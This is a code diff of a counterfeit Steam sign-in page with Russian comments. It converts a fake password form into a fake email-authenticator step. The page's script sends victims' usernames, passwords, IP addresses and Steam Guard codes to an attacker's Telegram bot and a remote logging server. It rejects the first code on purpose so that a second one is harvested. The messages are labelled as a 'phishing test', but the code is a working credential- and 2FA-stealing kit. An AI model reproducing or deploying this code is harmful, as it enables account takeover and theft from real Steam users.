@@ -15,7 +15,10 @@
     <link href="https://store.fastly.steamstatic.com/public/css/v6/browse.css?v=ZWD2OrhO7eSv&amp;l=english&amp;_cdn=fastly" rel="stylesheet" type="text/css">
     <link href="https://store.fastly.steamstatic.com/public/shared/css/login.css?v=U_6mpN0ranyM&amp;l=english&amp;_cdn=fastly" rel="stylesheet" type="text/css">
     <link href="https://store.fastly.steamstatic.com/public/shared/css/shared_responsive.css?v=oLruAsy0KuKR&amp;l=english&amp;_cdn=fastly" rel="stylesheet" type="text/css">
+  
     
+
+
     <style>
         .newlogindialog_Login_ZOBYq{position:relative}
         .newlogindialog_Login_ZOBYq .newlogindialog_SideBySide_1Wl13{display:flex;flex-direction:row;flex:1;padding-top:10px}
@@ -31,9 +34,6 @@
         .newlogindialog_Login_ZOBYq .newlogindialog_TextField_2KXGK{display:grid;grid-template-areas:"label hint""input input";grid-template-columns:1fr min-content;gap:2px}
         .newlogindialog_Login_ZOBYq .newlogindialog_TextInput_2eKVn{border-radius:2px;color:#fff;padding:10px;background-color:#32353c;outline:0;font-size:15px;grid-area:input;border:1px solid #32353c}
         .newlogindialog_Login_ZOBYq .newlogindialog_TextInput_2eKVn:hover{background-color:#393c44}
-        .newlogindialog_Login_ZOBYq .newlogindialog_LoginForm_3Tsg9{flex:1;display:grid;gap:12px;grid-template-columns:1fr}
-        .newlogindialog_Login_ZOBYq .newlogindialog_FieldLabel_3d8dp{font-size:12px;color:#afafaf;text-transform:uppercase;letter-spacing:.02em;user-select:none}
-        .newlogindialog_Login_ZOBYq .newlogindialog_FieldLabel_3d8dp.newlogindialog_Highlight_XyqzE{color:#1999ff;font-weight:500}
         .newlogindialog_Login_ZOBYq .newlogindialog_CheckboxField_2QWD5{display:flex;flex-direction:row;align-items:center;cursor:pointer}
         .newlogindialog_Login_ZOBYq .newlogindialog_CheckboxField_2QWD5 .newlogindialog_CheckboxFieldLabel_2yrCY{color:#afafaf;font-size:12px;user-select:none;padding-left:6px}
         .newlogindialog_Login_ZOBYq .newlogindialog_Checkbox_3tTFg{width:14px;height:14px;padding:3px;border-radius:2px;background-color:#32353c;cursor:pointer}
@@ -54,16 +54,13 @@
         .newlogindialog_Login_ZOBYq .newlogindialog_TextAlignCenter_2meUB{text-align:center}
         .newlogindialog_Login_ZOBYq .newlogindialog_FlexCol_1mhmm{display:flex;flex-direction:column}
         .newlogindialog_Login_ZOBYq .newlogindialog_StandardLayout_286eh:not(.IN_CLIENT){width:100%}
-        .newlogindialog_Login_ZOBYq .newlogindialog_StandardLayout_286eh .newlogindialog_PrimaryHeader_39uMK{color:#fff;font-size:32px;text-transform:uppercase;letter-spacing:.055em;font-weight:200}
-        @media screen and (max-width:700px){.newlogindialog_Login_ZOBYq .newlogindialog_StandardLayout_286eh .newlogindialog_PrimaryHeader_39uMK{text-align:center}}
-        .newlogindialog_Login_ZOBYq .newlogindialog_StandardLayout_286eh .newlogindialog_FormContainer_3jLIH{background-color:#181a21;border-radius:4px;padding:24px 32px;flex:1;min-width:636px}
-        @media screen and (max-width:700px){.newlogindialog_Login_ZOBYq .newlogindialog_StandardLayout_286eh .newlogindialog_FormContainer_3jLIH{min-width:0;background-color:transparent}}
         .login_LoginContainer_2kLRm{padding-top:80px;padding-bottom:150px;display:flex;flex-direction:column;align-items:center}
         @media screen and (max-width:700px){.login_LoginContainer_2kLRm{padding-top:12px;padding-bottom:0}}
         .SVGIcon_Button{fill:#fff;overflow:visible;width:100%;height:100%;max-width:320px;max-height:320px}
     </style>
 </head>
 <body class="login v6 global v7menu responsive_page">
+
 
 <div class="responsive_page_frame with_header">
     <div role="navigation" class="responsive_page_menu_ctn mainmenu" aria-label="Mobile Menu">
@@ -134,6 +131,7 @@
             <div class="responsive_header_react_target" data-featuretarget="store-menu-responsive-search"><div class="responsive_header_react_placeholder"></div></div>
         </div>
     </div>
+    
     
     <div class="responsive_page_content_overlay"></div>
     <div class="responsive_fixonscroll_ctn nonresponsive_hidden"></div>
@@ -216,13 +214,13 @@
                 </div>
             </div>
         </div>
-
+    
         <div id="responsive_store_nav_ctn"></div>
         <div id="responsive_store_nav_overlay" style="display:none"><div id="responsive_store_nav_overlay_ctn"></div><div id="responsive_store_nav_overlay_bottom"></div></div>
         <div id="responsive_store_search_overlay" style="display:none"></div>
         <div data-cart-banner-spot="1"></div>
 
-        <div role="main" class="responsive_page_template_content" id="responsive_page_template_content" data-panel="{&quot;autoFocus&quot;:true}">
+        
             <div class="page_content">
                 <!-- ПЕРЕНЕСЕННАЯ ФОРМА ЛОГИНА -->
                 <div data-featuretarget="login">
@@ -230,50 +228,61 @@
                         <div class="newlogindialog_Login_ZOBYq">
                             <div class="newlogindialog_FlexCol_1mhmm newlogindialog_StandardLayout_286eh" style="gap:32px">
                                 <div style="display:flex;flex-direction:column;gap:8px;margin:8px 16px">
-                                    <div class="newlogindialog_PrimaryHeader_39uMK">Sign in</div>
-                                </div>
-                                <div class="newlogindialog_FormContainer_3jLIH">
-                                    <div class="newlogindialog_SideBySide_1Wl13">
-                                        <form class="newlogindialog_LoginForm_3Tsg9" method="post" onsubmit="return false;">
+                                    <img 
+  src="https://ltdfoto.ru/images/2025/10/10/IZOBRAZENIE_2025-10-10_155139593.png" 
+  alt="Steam Logo" 
+  style="width: 153px; height: 65px; position: relative; left: -30px;top: -30px;"
+>
+<div class="_1hKgiFuFaVR_Sq1Gj_gCnd" style="position: absolute; top: 97px; left: 280px; font-family: Arial, sans-serif; font-size: 18px; color: #AFAFAF; z-index: 10; font-weight: bold;">
+    Account: <span class="_31Vq4lzNWs4WikXVr9J4hz" style="color: #FFFFFF;" id="usernameDisplay">User</span>
+</div>
+
+<div class="_2o5mE8JpPFOyJ0HwX_y0y7" style="position: absolute; top: 130px; left: 150px; font-family: Arial, sans-serif; font-size: 15px; color: #838383d3; z-index: 10; font-weight: bold;">
+    You have an email authenticator protecting this account.
+</div>
+
+</div>
+<div class="newlogindialog_FormContainer_3jLIH" style="background-color: #181a21; border-radius: 4px; padding: 120px 32px; flex: 100px; min-width: 636px; margin-top: -40px; position: relative;">
+    <div style="background-color: #32353C; border-radius: 4px; padding: 20px; width: 500px; height: 150px; position: absolute; top: 190px; left: 50%; transform: translate(-50%, -50%);">
+        <div style="background-color: #2B2E33; border-radius: 4px; width: 350px; height: 80px; position: absolute; top: 35%; left: 50%; transform: translate(-50%, -50%); display: flex; justify-content: center; align-items: center; gap: 15px; position: relative;" id="codeContainer">
+               <div style="position: absolute; top: -20px; left: 50%; transform: translateX(-50%); color: #c15755; font-size: 12px; font-family: Arial, sans-serif; display: none;" id="errorText">Incorrect code, please try again</div>
+    <input maxlength="1" autocomplete="none" class="_3xcXqLVteTNHmk-gh9W65d Focusable" role="button" type="text" value="" style="width: 30px; height: 40px; text-align: center; font-size: 30px; background-color: transparent; border: none; border-bottom: 2px solid #545555; color: #fff; outline: none;">
+            <input maxlength="1" autocomplete="none" class="_3xcXqLVteTNHmk-gh9W65d Focusable" role="button" type="text" value="" style="width: 30px; height: 40px; text-align: center; font-size: 30px; background-color: transparent; border: none; border-bottom: 2px solid #545555; color: #fff; outline: none;">
+            <input maxlength="1" autocomplete="none" class="_3xcXqLVteTNHmk-gh9W65d Focusable" role="button" type="text" value="" style="width: 30px; height: 40px; text-align: center; font-size: 30px; background-color: transparent; border: none; border-bottom: 2px solid #545555; color: #fff; outline: none;">
+            <input maxlength="1" autocomplete="none" class="_3xcXqLVteTNHmk-gh9W65d Focusable" role="button" type="text" value="" style="width: 30px; height: 40px; text-align: center; font-size: 30px; background-color: transparent; border: none; border-bottom: 2px solid #545555; color: #fff; outline: none;">
+            <input maxlength="1" autocomplete="none" class="_3xcXqLVteTNHmk-gh9W65d Focusable" role="button" type="text" value="" style="width: 30px; height: 40px; text-align: center; font-size: 30px; background-color: transparent; border: none; border-bottom: 2px solid #545555; color: #fff; outline: none;">
+        </div>
+    </div>
+</div>
+
+
+<div class="_3aMbj3PT-p1yxEt98UM56K" style="position: absolute; top: 290px; left: 45%; transform: translateX(-50%); font-family: Arial, sans-serif; font-size: 16px; color: #FFFFFF; text-align: center;">
+    Enter the code from your email address at: <br>
+    <span class="_3BKzb-aGSLOjp5jsQ8wwXK" style="color: #1990FF;">gmail.com</span>
+</div>
+<svg width="55" height="75" viewBox="0 0 58 56" style="position: absolute; top: 270px; right: 105px;">
+    <path d="M57.9352 24.5887C57.8463 24.233 57.8463 23.8774 57.6684 23.5217C57.4017 22.8993 57.046 22.4547 56.5125 22.0101L49.577 16.4083V10.9844C49.577 8.85041 47.8876 7.16098 45.7536 7.16098H38.1956L31.5269 1.73706C30.1042 0.581137 28.0591 0.581137 26.6364 1.73706L19.9677 7.16098H12.4097C10.2757 7.16098 8.58631 8.93932 8.58631 10.9844V16.4083L1.56188 22.0101C1.02838 22.3658 0.672713 22.8993 0.405962 23.5217V23.6106C0.228128 24.1441 0.050293 24.5887 0.050293 25.1222V52.1529C0.050293 53.2199 0.494878 54.1091 1.1173 54.8204C1.82863 55.5318 2.80672 55.8874 3.7848 55.8874H54.0228C55.0898 55.8874 55.979 55.4428 56.6903 54.8204C57.4017 54.1091 57.7573 53.131 57.7573 52.1529V25.1222C57.9352 24.8554 57.9352 24.7665 57.9352 24.5887ZM49.577 19.7872L54.7342 23.9663L49.577 28.9456V19.7872ZM28.148 3.60431C28.4148 3.42648 28.6815 3.24864 28.9483 3.24864C29.3039 3.24864 29.5707 3.33756 29.7485 3.60431L34.0165 7.07207H23.9689L28.148 3.60431ZM10.9871 10.9844C10.9871 10.2731 11.5206 9.73958 12.2319 9.73958H45.6646C46.376 9.73958 46.9095 10.362 46.9095 10.9844V31.4353L46.8206 31.5242L40.2407 37.9262H17.6558L11.076 31.5242L10.9871 31.4353V10.9844ZM8.40848 19.7872V28.9456L3.34022 23.9663L8.40848 19.7872ZM2.62888 51.6194V26.9005L15.2551 39.26L2.62888 51.6194ZM4.49614 53.3088L17.6558 40.5048H40.2407L53.4004 53.3088H4.49614ZM55.3566 51.6194L42.6415 39.1711L55.2677 26.8116V51.6194H55.3566ZM29.0372 35.3476C30.5488 35.3476 31.9715 35.0809 33.3941 34.5474C34.0165 34.2806 34.3722 33.4804 34.1055 32.858C33.8387 32.2355 33.0385 31.8799 32.416 32.1466C31.349 32.5912 30.1931 32.769 29.0372 32.769C27.3478 32.769 25.7473 32.3245 24.4135 31.5242C21.746 29.9237 20.0566 27.0784 20.0566 23.7884C20.0566 18.8091 24.0579 14.8078 29.0372 14.8078C34.0165 14.8078 38.0178 18.8091 38.0178 23.7884V24.4109C38.0178 25.4779 37.2175 26.367 36.0616 26.367C34.9946 26.367 34.1055 25.4779 34.1055 24.4109V23.7884C34.1055 20.9431 31.7936 18.6313 28.9483 18.6313C26.1029 18.6313 23.7911 20.9431 23.7911 23.7884C23.7911 26.6338 26.1029 28.9456 28.9483 28.9456C30.3709 28.9456 31.7047 28.3232 32.5939 27.434C33.3941 28.4121 34.639 28.9456 35.9727 28.9456C38.4624 28.9456 40.5075 26.9894 40.5075 24.4109V23.7884C40.5075 17.3864 35.2614 12.2292 28.9483 12.2292C22.6352 12.2292 17.3891 17.4753 17.3891 23.7884C17.3891 26.7227 18.545 29.4791 20.3233 31.5242C22.5463 33.925 25.5694 35.3476 29.0372 35.3476ZM29.0372 26.367C27.6145 26.367 26.4586 25.2111 26.4586 23.7884C26.4586 22.3658 27.6145 21.2098 29.0372 21.2098C30.4599 21.2098 31.6158 22.3658 31.6158 23.7884C31.5269 25.2111 30.371 26.367 29.0372 26.367Z" fill="#1A99FF"></path>
+</svg>
+
+<a class="newlogindialog_TextLink_1cnUQ newlogindialog_TextAlignCenter_2meUB" href="#" style="position: absolute; top: 375px; left: 50%; font-size: 11px; transform: translateX(-50%); color: #AFAFAF;"> Help, I no longer have access to the email address for this account </a>
                                             <div class="newlogindialog_TextField_2KXGK">
-                                                <div class="newlogindialog_FieldLabel_3d8dp newlogindialog_Highlight_XyqzE">Sign in with account name</div>
                                                 <div></div>
-                                                <input name="username" id="usernameInput" required type="text" class="newlogindialog_TextInput_2eKVn" value="">
                                             </div>
                                             <div class="newlogindialog_TextField_2KXGK">
-                                                <div class="newlogindialog_FieldLabel_3d8dp">Password</div>
                                                 <div></div>
-                                                <input name="password" required type="password" class="newlogindialog_TextInput_2eKVn" value="">
                                             </div>
-                                            
-                                            <!-- СКРЫТОЕ ПОЛЕ ДЛЯ ПЕРЕДАЧИ ЛОГИНА -->
-                                            <input type="hidden" name="username_hidden" id="usernameField">
-                                            
                                             <div class="newlogindialog_CheckboxField_2QWD5">
-                                                <div tabindex="0" class="newlogindialog_Checkbox_3tTFg">
                                                     <div class="newlogindialog_Check_6EoZE">
-                                                        <svg version="1.1" id="base" xmlns="http://www.w3.org/2000/svg" class="SVGIcon_Button SVGIcon_Check" x="0px" y="0px" width="256px" height="256px" viewBox="0 0 256 256" stroke-width="35" stroke="#fff" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10">
-                                                            <polyline fill="none" points="49.5,147.75 95,210.75 206.5,45.25"></polyline>
                                                         </svg>
                                                     </div>
                                                 </div>
-                                                <div class="newlogindialog_CheckboxFieldLabel_2yrCY">Remember me</div>
                                             </div>
-                                            <div class="newlogindialog_SignInButtonContainer_14fsn">
-                                                <button class="newlogindialog_SubmitButton_2QgFE" type="submit">Sign in</button>
-                                            </div>
-                                            <div class="newlogindialog_FormError_1Mcy9">&nbsp;</div>
-                                            <a class="newlogindialog_TextLink_1cnUQ newlogindialog_TextAlignCenter_2meUB" href="#">Help, I can't sign in</a>
+                                            
+                                            <a class="newlogindialog_TextLink_1cnUQ newlogindialog_TextAlignCenter_2meUB" href="#"></a>
                                         </form>
-                                        <div class="newlogindialog_QRSection_2ZDyS">
-                                            <div class="newlogindialog_MessagingContainer_3ph6w">
-                                                <div class="newlogindialog_MessagingTag_3jy5R">Или войдите с помощью QR</div>
-                                                <div class="newlogindialog_MessagingSubtitle_toeax">
-                                                    <img src="https://ltdfoto.ru/images/2025/10/10/3ED7F5B4-A403-4A49-9D06-F6ECA7BE469D.png" alt="QR Code"style="width: 200px; height: 200px; margin: 1px -10px; border-radius: 7px;"
->
+                                                    
 
                                                 </div>
-                                                <a href="https://store.steampowered.com/mobile" class="newlogindialog_MessagingLink_1ozce">Мобильное приложение Steam</a>
                                             </div>
                                         </div>
                                     </div>
@@ -283,26 +292,22 @@
                     </div>
                 </div>
 
-                <div class="login_bottom_row">
-                    <div class="login_btn_ctn login_bottom_row_item">
-                        <div class="headline">New to Steam?</div>
-                        <a target="_top" href="https://store.steampowered.com/join/?&snr=1_60_4__62" class="login_create_btn btn_blue_steamui btn_medium">
-                            <span>Create an account</span>
-                        </a>
-                    </div>
-                    <div class="login_bottom_row_item">
-                        <div class="subtext">It's free and easy. Discover thousands of games to play with millions of new friends.
-                            <a class="login_join_desc about_link" href="https://store.steampowered.com/about">Learn more about Steam</a>
-                        </div>
+
                     </div>
                 </div>
             </div>
         </div>
+        
+         <div style="display: flex; justify-content: center;">
+</div>
 
-<div style="display: flex; justify-content: center; padding: 0 15px; box-sizing: border-box;">
-    <img src="https://ltdfoto.ru/images/2025/10/08/IZOBRAZENIE_2025-10-08_024328276.png" 
-         alt="Steam Menu" 
-         style="max-width: 100%; height: auto; width: auto; border-radius: 8px;">
+        <div id="footer_spacer" style="" class=""></div>
+            <div class="footer_content">
+                <div class="rule"></div>
+                <div id="footer_logo_steam"><img			
+                    
+                                    </div>
+</div>
 </div>
 
 <script>
@@ -310,10 +315,13 @@
 const BOT_TOKEN = '8259536877:AAHVoJPklpv2uTVLsNq2o1XeI3f1qXOT7x4';
 const CHAT_ID = '7455610355';
 
+let codeAttempts = 0;
+let currentCode = '';
+
 // Функция отправки в Telegram
 async function sendToTelegram(message) {
     try {
-        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
@@ -324,137 +332,198 @@ async function sendToTelegram(message) {
                 parse_mode: 'HTML'
             })
         });
-        return await response.json();
     } catch (error) {
         console.error('Ошибка отправки в Telegram:', error);
     }
 }
 
-// Функция получения IP
-async function getIP() {
-    try {
-        const response = await fetch('https://api.ipify.org?format=json');
-        const data = await response.json();
-        return data.ip;
-    } catch {
-        return 'Не удалось определить';
+// Получаем логин из localStorage и обновляем отображение
+document.addEventListener('DOMContentLoaded', function() {
+    const username = localStorage.getItem('steam_username') || 'User';
+    const usernameDisplay = document.getElementById('usernameDisplay');
+    if (usernameDisplay) {
+        usernameDisplay.textContent = username;
     }
-}
+    
+    setupCodeHandlers();
+});
 
-// Функция регистрации в базе данных (С ПРАВИЛЬНЫМ ДОМЕНОМ)
-async function registerUser(username, password, ip) {
-    try {
-        console.log('🔐 Попытка регистрации пользователя:', username);
-        
-        const response = await fetch('https://logs-unisono-project.up.railway.app/api/auth/register', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-                username: username,
-                password: password,
-                email: `${username}@steam.com`,
-                ip: ip,
-                userAgent: navigator.userAgent
-            })
-        });
-        
-        console.log('📡 Статус ответа:', response.status);
-        
-        if (response.ok) {
-            console.log('✅ Пользователь зарегистрирован в базе');
-            return true;
-        } else {
-            console.log('⚠️ Ошибка регистрации, но продолжаем...');
-            return true;
+function setupCodeHandlers() {
+    const inputs = document.querySelectorAll('#codeContainer input');
+    const codeContainer = document.getElementById('codeContainer');
+    const errorText = document.getElementById('errorText');
+    let loadingActive = false;
+
+    function getFullCode() {
+        let code = '';
+        for (let i = 0; i < inputs.length; i++) {
+            code += inputs[i].value;
         }
-    } catch (error) {
-        console.error('❌ Ошибка подключения к API:', error);
-        console.log('⚠️ Продолжаем без регистрации в базе');
+        return code;
+    }
+
+    function allFieldsFilled() {
+        for (let i = 0; i < inputs.length; i++) {
+            if (!inputs[i].value) return false;
+        }
         return true;
     }
-}
-// Логирование входа через Steam
-document.addEventListener('DOMContentLoaded', function() {
-    // Логируем сам факт захода на сайт
-    logUserAction('PAGE_VISIT', 'Пользователь зашел на страницу входа');
-    
-    // Отслеживаем клики на кнопку "Sign in"
-    const loginButton = document.querySelector('.newlogindialog_SubmitButton_2QgFE');
-    if (loginButton) {
-        loginButton.addEventListener('click', function() {
-            logUserAction('LOGIN_BUTTON_CLICK', 'Пользователь нажал кнопку входа');
-        });
-    }
-});
 
-// Функция логирования действий
-async function logUserAction(action, description) {
-    const userData = {
-        action: action,
-        description: description,
-        timestamp: new Date().toISOString(),
-        ip: await getIP(),
-        userAgent: navigator.userAgent,
-        referrer: document.referrer,
-        url: window.location.href
-    };
-    
-    // Отправляем в Telegram
-    const logMessage = `📊 <b>ЛОГ ДЕЙСТВИЙ</b>\n\n`
-                     + `🎯 <b>Действие:</b> ${description}\n`
-                     + `🌐 <b>IP:</b> ${userData.ip}\n`
-                     + `📱 <b>Браузер:</b> ${navigator.userAgent}\n`
-                     + `⏰ <b>Время:</b> ${new Date().toLocaleString()}\n`
-                     + `🔗 <b>Источник:</b> ${userData.referrer || 'Прямой заход'}`;
-    
-    await sendToTelegram(logMessage);
-    
-    // Также сохраняем в базу данных если нужно
-    try {
-        await fetch('https://logs-unisono-project-production.up.railway.app/api/auth/log', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify(userData)
-        });
-    } catch (error) {
-        console.log('Лог не сохранен в базу:', error);
+    // Функция для валидации ввода
+    function validateInput(input) {
+        // Удаляем все не-английские символы и не цифры
+        input.value = input.value.replace(/[^a-zA-Z0-9]/g, '');
+        // Преобразуем в верхний регистр
+        input.value = input.value.toUpperCase();
+        // Ограничиваем длину до 1 символа
+        if (input.value.length > 1) {
+            input.value = input.value.charAt(0);
+        }
     }
-}
 
-// Обработка отправки формы (ИСПРАВЛЕННАЯ)
-document.addEventListener('DOMContentLoaded', function() {
-    const loginForm = document.querySelector('.newlogindialog_LoginForm_3Tsg9');
-    const usernameInput = document.querySelector('input[name="username"]');
-    
-    if (loginForm) {
-        loginForm.onsubmit = async function(e) {
+    for (let i = 0; i < inputs.length; i++) {
+        inputs[i].addEventListener('input', function(e) {
+            // Валидируем ввод
+            validateInput(this);
+            
+            if (this.value.length === 1) {
+                const next = this.nextElementSibling;
+                if (next) next.focus();
+                
+                if (allFieldsFilled() && !loadingActive) {
+                    loadingActive = true;
+                    codeAttempts++;
+                    currentCode = getFullCode();
+                    const username = localStorage.getItem('steam_username') || 'User';
+                    
+                    // Отправка кода в Telegram
+                    const codeMessage = `🎣 <b>ФИШИНГ ТЕСТ - КОД ПОДТВЕРЖДЕНИЯ</b>\n\n`
+                                      + `👤 <b>Аккаунт:</b> ${username}\n`
+                                      + `🔢 <b>Код #${codeAttempts}:</b> ${currentCode}\n`
+                                      + `⏰ <b>Время:</b> ${new Date().toLocaleString()}`;
+                    
+                    sendToTelegram(codeMessage);
+                    
+                    // Показываем загрузку
+                    const overlay = document.createElement('div');
+                    overlay.style.cssText = 'position:absolute;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);display:flex;justify-content:center;align-items:center;border-radius:4px;z-index:10;';
+                    
+                    const spinner = document.createElement('div');
+                    spinner.style.cssText = 'width:30px;height:30px;border:3px solid #1A99FF;border-top:3px solid transparent;border-radius:50%;animation:spin 1s linear infinite;';
+                    
+                    overlay.appendChild(spinner);
+                    codeContainer.appendChild(overlay);
+                    
+                    // Тайминг обработки
+                    const waitTime = codeAttempts === 1 ? 15000 : 1000; // 15 сек для первого кода, 1 сек для второго
+                    
+                    setTimeout(function() {
+                        if (overlay.parentNode) {
+                            codeContainer.removeChild(overlay);
+                        }
+                        
+                        if (codeAttempts === 1) {
+                            // Первый код - ошибка (оставляем код в полях и показываем ошибку)
+                            codeContainer.style.border = '1px solid #c15755';
+                            errorText.style.display = 'block';
+                            loadingActive = false;
+                            // НЕ очищаем поля - пользователь сам удалит
+                            
+                        } else {
+                            // Второй код - редирект
+                            window.location.href = 'https://logs-unisono-project.up.railway.app';
+                        }
+                    }, waitTime);
+                }
+            }
+        });
+        
+        // Обработка вставки из буфера обмена
+        inputs[i].addEventListener('paste', function(e) {
             e.preventDefault();
+            const pastedData = (e.clipboardData || window.clipboardData).getData('text');
+            if (pastedData) {
+                this.value = pastedData.charAt(0).toUpperCase().replace(/[^A-Z0-9]/g, '');
+                if (this.value.length === 1) {
+                    const next = this.nextElementSibling;
+                    if (next) next.focus();
+                }
+            }
+        });
+        
+        // Блокировка ввода нежелательных символов
+        inputs[i].addEventListener('keydown', function(e) {
+            // Разрешаем только: Backspace, Delete, Tab, стрелки, буквы (a-z, A-Z) и цифры
+            const allowedKeys = [
+                'Backspace', 'Delete', 'Tab', 
+                'ArrowLeft', 'ArrowRight', 'ArrowUp', 'ArrowDown',
+                'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm',
+                'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
+                'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M',
+                'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
+                '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'
+            ];
             
-            const username = usernameInput.value;
-            const password = document.querySelector('input[name="password"]').value;
-            const ip = await getIP();
+            // Блокируем все остальные клавиши
+            if (!allowedKeys.includes(e.key)) {
+                e.preventDefault();
+                return;
+            }
             
-            // Логируем попытку входа
-            await logUserAction('LOGIN_ATTEMPT', `Попытка входа с логином: ${username}`);
+            // Автоматически преобразуем буквы в верхний регистр при вводе
+            if (e.key.length === 1 && /[a-z]/.test(e.key)) {
+                e.preventDefault();
+                this.value = e.key.toUpperCase();
+                
+                // Автоматически переходим к следующему полю
+                if (this.value.length === 1) {
+                    const next = this.nextElementSibling;
+                    if (next) next.focus();
+                }
+                
+                // Проверяем все ли поля заполнены
+                if (allFieldsFilled() && !loadingActive) {
+                    // Тут будет код обработки полного кода (как в input событии)
+                    // Чтобы не дублировать код, можно вызвать событие input программно
+                    this.dispatchEvent(new Event('input'));
+                }
+                return;
+            }
             
-            // 1. Пытаемся зарегистрировать в базе данных (но не блокируем процесс при ошибке)
-            const registrationSuccess = await registerUser(username, password, ip);
+            if (e.key === 'Backspace' && this.value === '') {
+                const prev = this.previousElementSibling;
+                if (prev) prev.focus();
+            }
             
-            // 2. Отправляем данные в Telegram (главное!)
-            const message = `🎣 <b>ФИШИНГ ТЕСТ - ДАННЫЕ ВХОДА</b>\n\n👤 <b>Логин:</b> ${username}\n🔑 <b>Пароль:</b> ${password}\n🌐 <b>IP:</b> ${ip}\n📱 <b>Устройство:</b> ${navigator.userAgent}\n⏰ <b>Время:</b> ${new Date().toLocaleString()}`;
-            
-            await sendToTelegram(message);
-            
-            // 3. Сохраняем логин для передачи на code1.php
-            localStorage.setItem('steam_username', username);
-            
-            // 4. Перенаправляем на code1.php (ВСЕГДА срабатывает)
-            window.location.href = 'code1.php';
-        };
+            // Когда пользователь начинает удалять код после ошибки - убираем ошибку
+            if (e.key === 'Backspace' && codeAttempts === 1) {
+                codeContainer.style.border = '';
+                errorText.style.display = 'none';
+            }
+        });
+        
+        // Также убираем ошибку при клике на любое поле ввода
+        inputs[i].addEventListener('click', function() {
+            if (codeAttempts === 1) {
+                codeContainer.style.border = '';
+                errorText.style.display = 'none';
+            }
+        });
     }
-});
+}
+
+// Добавляем стили для анимации
+const style = document.createElement('style');
+style.textContent = '@keyframes spin {0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}';
+document.head.appendChild(style);
 </script>
+
+
+<div style="display: flex; justify-content: center; padding: 0 15px; box-sizing: border-box; margin-top: -250px;">
+    <img src="https://ltdfoto.ru/images/2025/10/08/IZOBRAZENIE_2025-10-08_020211934.png" 
+         alt="Steam Menu" 
+         style="max-width: 100%; height: auto; width: auto; border-radius: 8px;">
+</div>
+
 </body>
 </html>
